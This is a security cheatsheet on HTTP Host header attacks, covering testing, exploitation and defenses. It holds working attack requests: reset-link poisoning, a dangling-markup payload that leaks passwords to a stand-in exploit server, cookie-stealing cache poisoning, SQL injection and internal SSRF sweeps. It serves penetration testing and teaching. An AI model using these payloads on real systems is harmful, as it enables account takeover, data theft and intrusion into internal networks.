# HTTP Host Header Attacks — Cheatsheet

---

## Table of Contents

- [TL;DR](#tldr)
- [1. Why this works](#1-why-this-works)
- [2. Testing Checklist](#2-testing-checklist)
  - [2.1 Random Host](#21-random-host)
  - [2.2 Flawed validation tricks](#22-flawed-validation-tricks)
  - [2.3 Ambiguous requests](#23-ambiguous-requests-front-end-vs-back-end-disagree)
  - [2.4 Override headers](#24-override-headers)
- [3. Exploitation Playbook](#3-exploitation-playbook)
  - [3.1 Password reset poisoning](#31-password-reset-poisoning)
  - [3.2 Web cache poisoning](#32-web-cache-poisoning)
  - [3.3 Classic server-side injection](#33-classic-server-side-injection)
  - [3.4 Access-control bypass](#34-access-control-bypass)
  - [3.5 Virtual-host brute-forcing](#35-virtual-host-brute-forcing)
  - [3.6 Routing-based SSRF ("Host header SSRF")](#36-routing-based-ssrf-host-header-ssrf--most-severe)
  - [3.7 Connection-state attacks](#37-connection-state-attacks)
  - [3.8 SSRF via malformed request line](#38-ssrf-via-malformed-request-line)
- [4. Quick-Reference: Things to Fuzz](#4-quick-reference-things-to-fuzz)
- [5. Defense Cheatsheet](#5-defense-cheatsheet)

---

## TL;DR

- Every HTTP/1.1 request carries a client-controlled `Host` header. If the app **trusts it blindly**, you can poison emails/caches, bypass access checks, reach internal systems, and more.
- **Test** → tamper with `Host` (and related headers), watch for reflection / behavior change / out-of-band callback.
- **Exploit** → turn that trust into password reset poisoning, cache poisoning, SQLi, access-control bypass, vhost enumeration, SSRF, or connection-state abuse.
- **Fix** → never build logic/links from `Host`. Hard-code the domain, validate with an allow-list, strip override headers.

---

## 1. Why this works

- **Virtual hosting / reverse proxies** mean one IP serves many sites, so the server needs `Host` to know which site/back-end you want.
- Many apps don't know their own domain, so they build links straight from the header:
  ```php
  $link = "https://" . $_SERVER['HTTP_HOST'] . "/support";
  ```
  Send `Host: evil.com` → link points to `evil.com`.
- Root causes: developers assume users can't edit `Host` (they can, trivially, with Burp); override headers like `X-Forwarded-Host` are honored by default; proxies/CDNs/frameworks are misconfigured without anyone realizing.

---

## 2. Testing Checklist

Needs a proxy (Burp) that can edit `Host` without changing the actual network destination — a browser can't do this.

**Signals it's exploitable (any one of these):**

| Signal | What it looks like |
|---|---|
| **Reflection** | Your fake Host (or a derived link/script src/redirect) shows up in the response body or headers |
| **Behavioral difference** | Different content/access for different Host values, nothing else changed |
| **Out-of-band callback** | Host set to your Collaborator domain → you get a DNS/HTTP hit |
| **No error where expected** | Bogus Host returns 200 instead of `400 Invalid Host header` → validation is weak/absent |

### 2.1 Random Host
```
GET /account HTTP/1.1
Host: totally-random-domain-xyz.com
```
| Result | Meaning |
|---|---|
| Error page | Front-end/CDN rejects unknown hosts → try ambiguous requests / override headers |
| You still reach the site | Server has a fallback/default site — study how it uses the header |
| You reach a *different* site | You landed on another vhost on the same server |

### 2.2 Flawed validation tricks
```
Host: vulnerable-website.com:bad-stuff-here        # a) port ignored by parser
Host: notvulnerable-website.com                    # b) suffix match instead of exact match
Host: hacked-subdomain.vulnerable-website.com       # c) trusted wildcard subdomain you control
```

### 2.3 Ambiguous requests (front-end vs back-end disagree)
```
# a) Duplicate Host headers
Host: vulnerable-website.com
Host: bad-stuff-here

# b) Absolute URL in request line
GET https://vulnerable-website.com/ HTTP/1.1
Host: bad-stuff-here

# c) Line-wrapped / indented Host
GET /example HTTP/1.1
    Host: bad-stuff-here
Host: vulnerable-website.com
```
Also worth trying: HTTP request smuggling techniques (see request-smuggling notes).

### 2.4 Override headers
```
X-Forwarded-Host: bad-stuff-here
X-Host
X-Forwarded-Server
X-HTTP-Host-Override
Forwarded: host=evil.com
```
Burp **Param Miner** → "Guess headers" brute-forces which of these a target honors.

---

## 3. Exploitation Playbook

### 3.1 Password reset poisoning
Flow: email/username submitted → server emails a reset link built from `Host`.
```
POST /forgot-password HTTP/1.1
Host: evil-user.net

email=victim@example.com
```
Victim receives a **genuine** email with a link to `evil-user.net/reset?token=...`. Click (or an email-security scanner auto-fetches it) → token lands in attacker's logs → attacker replays the token on the real site → account takeover.

**Dangling-markup variant (port injection):** if the app reflects the Host "port" into an unescaped HTML attribute (e.g. a password-recovery email containing `href='https://site.net:PORT/login'`), inject a broken-out tag instead of a port:
```
Host: vulnerable-web.net:'<a href="https://hacker.exploit-server.net/?
```
- `'` closes the original attribute early
- the new `<a href="...">` uses double quotes with no closing `"` nearby, so the browser keeps swallowing everything after it (including the new password) into the URL
- check the exploit server's access log for the leaked data

### 3.2 Web cache poisoning
Works best against **app-level caches** (standalone CDNs usually key on Host already).
```
1. Add a cache buster so you can force fresh responses while testing: GET /?cb=123
2. Find an unvalidated-but-reflected injection point, e.g. a 2nd Host header:
   Host: lab-id.web-security-academy.net
   Host: asd.net
   → reflected into <script src="//asd.net/..."> but routing still works
3. Resend with the SAME cache buster, 2nd header removed → still see the poisoned
   version = proof the cache stored it (check X-Cache: hit / miss, Age headers)
4. Host your payload file at the path the app appends, e.g. /resources/js/tracking.js
   containing: alert(document.cookie)
5. Send the real payload with Host pointing at your exploit server + that path,
   replay until X-Cache: hit
6. Drop the cache buster and keep replaying until the LIVE homepage is poisoned
```

### 3.3 Classic server-side injection
Treat `Host` as untrusted input — if it flows into SQL, a template, or a shell command unescaped, standard injection applies:
```
Host: '; DROP TABLE users;--
```

### 3.4 Access-control bypass
If "is this internal/admin traffic?" is decided purely by `Host`:
```
GET /admin/dashboard HTTP/1.1
Host: admin.internal.example.com
```
```
GET /admin/dashboard HTTP/1.1
Host: localhost
```

### 3.5 Virtual-host brute-forcing
Internal hostnames may not be in public DNS but still resolve server-side:
```
Host: intranet.example.com
Host: staging.example.com
Host: dev.example.com
```
Automate with Burp Intruder + a subdomain wordlist (`intranet`, `internal`, `staging`, `dev`, `admin`...).

### 3.6 Routing-based SSRF ("Host header SSRF") — most severe
**Step 1 — confirm it routes on Host (external SSRF):**
```
Host: your-collaborator-id.oastify.com
```
DNS/HTTP hit on Collaborator = proxy is resolving/routing to whatever you put in Host.

**Step 2 — pivot to internal IPs:**
```
Host: 192.168.1.10
Host: 10.0.0.5
```
Use Intruder to sweep a range (remember to **deselect** "Update Host header to match target"):
```
Host: 192.168.0.§0§     (From 0, To 255, Step 1)
```
CIDR quick reference: `/16` fixes the first two octets (`192.168.0.0/16` = `192.168.0.0`–`192.168.255.255`); `/8` fixes the first octet (`10.0.0.0/8` = all of `10.x.x.x`).

### 3.7 Connection-state attacks
Some servers validate `Host` only on the **first** request of a reused TCP connection:
```
Request 1 (validated):   Host: public-site.com
Request 2 (not re-checked, same connection): Host: 192.168.0.1  → POST /admin/delete ...
```
Send both in sequence on the same connection (e.g. Burp's request tab group). Can revive SSRF / reset-poisoning / cache-poisoning even against apps that validate correctly on a fresh connection.

### 3.8 SSRF via malformed request line
If a proxy builds the back-end URL as `prefix + request-line-path`, and the path isn't required to start with `/`:
```
GET @private-intranet/example HTTP/1.1
```
→ proxy builds `http://backend-server@private-intranet/example`. HTTP libraries parse `user@host` as credentials, so the request is sent to `private-intranet`, authenticating as `backend-server`.

---

## 4. Quick-Reference: Things to Fuzz

**Headers:**
```
Host
X-Forwarded-Host
X-Host
X-Forwarded-Server
X-HTTP-Host-Override
Forwarded
```

**Request-shape tricks:**
```
1. Unknown/random Host value
2. Fake "port" payload           → Host: site.com:PAYLOAD
3. Suffix-matching bypass        → Host: notsite.com
4. Compromised-subdomain bypass  → Host: hacked.site.com
5. Duplicate Host headers
6. Absolute URL in the request line
7. Indented ("line-wrapped") Host header
8. Override headers
9. Same-connection smuggling (request 2 right after request 1)
10. Malformed request-line path (e.g. starting with @)
```

---

## 5. Defense Cheatsheet

| Defense | What it means | Example |
|---|---|---|
| Avoid the Host header | Use relative URLs | `<a href="/support">` |
| Hard-code your domain | Config value, not request-derived | `BASE_URL = "https://shop.example.com"` |
| Allow-list validation | Reject unexpected Host values | Django `ALLOWED_HOSTS` |
| Disable override headers | Don't honor `X-Forwarded-Host` unless needed | Strip at the edge |
| Allow-list proxy targets | LB/proxy only forwards to known back-ends | Proxy config |
| Separate internal apps | Don't co-host internal + public sites | Different servers/networks |

```python
# Safe link building
SITE_URL = "https://shop.example.com"
reset_link = f"{SITE_URL}/reset?token={token}"
```
```python
# Django
ALLOWED_HOSTS = ["shop.example.com", "www.shop.example.com"]
```
```nginx
# Nginx: reject unrecognized hosts
server {
    listen 80 default_server;
    return 444;
}
server {
    listen 80;
    server_name shop.example.com;
}
```
```nginx
# Strip a risky override header at the proxy
proxy_set_header X-Forwarded-Host "";
```

**Key takeaways:** treat `Host` as attacker-controlled input · never build links/logic from it · audit infra (proxies/frameworks), not just app code · keep internal and public sites apart · allow-list when you must use it.
